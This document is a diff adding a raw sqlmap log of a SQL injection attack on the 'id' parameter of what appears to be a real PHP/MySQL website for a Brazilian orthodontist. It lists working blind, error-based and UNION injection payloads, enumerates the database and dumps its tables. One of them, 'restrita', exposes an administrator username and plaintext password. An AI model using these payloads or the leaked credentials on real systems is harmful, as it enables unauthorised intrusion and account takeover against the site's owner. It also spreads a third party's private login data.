@@ -1,0 +1,96 @@
+sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 4466=4466
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x716b706b71,(SELECT (ELT(1031=1031,1))),0x7178786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b706b71,0x6e7872514d75704d587166757558776554696f6c536142446f734f694c7762514a4244734a6c6847,0x7178786271),NULL,NULL,NULL,NULL,NULL,NULL-- GLPO
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.36, Apache 2.2.34
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] alexdant_bd
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 4466=4466
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x716b706b71,(SELECT (ELT(1031=1031,1))),0x7178786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b706b71,0x6e7872514d75704d587166757558776554696f6c536142446f734f694c7762514a4244734a6c6847,0x7178786271),NULL,NULL,NULL,NULL,NULL,NULL-- GLPO
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.36, Apache 2.2.34
+back-end DBMS: MySQL >= 5.0
+Database: alexdant_bd
+[2 tables]
++----------+
+| noticias |
+| restrita |
++----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 4466=4466
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x716b706b71,(SELECT (ELT(1031=1031,1))),0x7178786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b706b71,0x6e7872514d75704d587166757558776554696f6c536142446f734f694c7762514a4244734a6c6847,0x7178786271),NULL,NULL,NULL,NULL,NULL,NULL-- GLPO
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.36, Apache 2.2.34
+back-end DBMS: MySQL >= 5.0
+Database: alexdant_bd
+[2 tables]
++----------+
+| noticias |
+| restrita |
++----------+
+
+Database: alexdant_bd
+Table: noticias
+[1 entry]
++----+---------------+-------------------------------------------------------------------------------------------------------------+---------+---------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------+----------+----------------+--------------+
+| id | foto          | texto                                                                                                       | exibir  | titulo                                                                          | resenha                                                                                    | destaque | imgDestaque    | dataCadastro |
++----+---------------+-------------------------------------------------------------------------------------------------------------+---------+---------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------+----------+----------------+--------------+
+| 1  | 1_materia.png | <p style="text-align: justify;">\r\n\tOrtodontista sertanezino utiliza t\xe9cnica eficiente para tratar pac | <blank> | Quem sofre com ronco e apneia tem tratamento de refer\xeancia em Sert\xe3ozinho | Todos t\xeam direito de sorrir e dormir com tranquilidade. Mas quando isso n\xe3o acontece | sim      | 1_destaque.png | 25/05/2012   |
++----+---------------+-------------------------------------------------------------------------------------------------------------+---------+---------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------+----------+----------------+--------------+
+
+Database: alexdant_bd
+Table: restrita
+[1 entry]
++----+--------------+--------+---------+
+| id | nome         | senha  | usuario |
++----+--------------+--------+---------+
+| 1  | Admnistrador | 123654 | admin   |
++----+--------------+--------+---------+
+
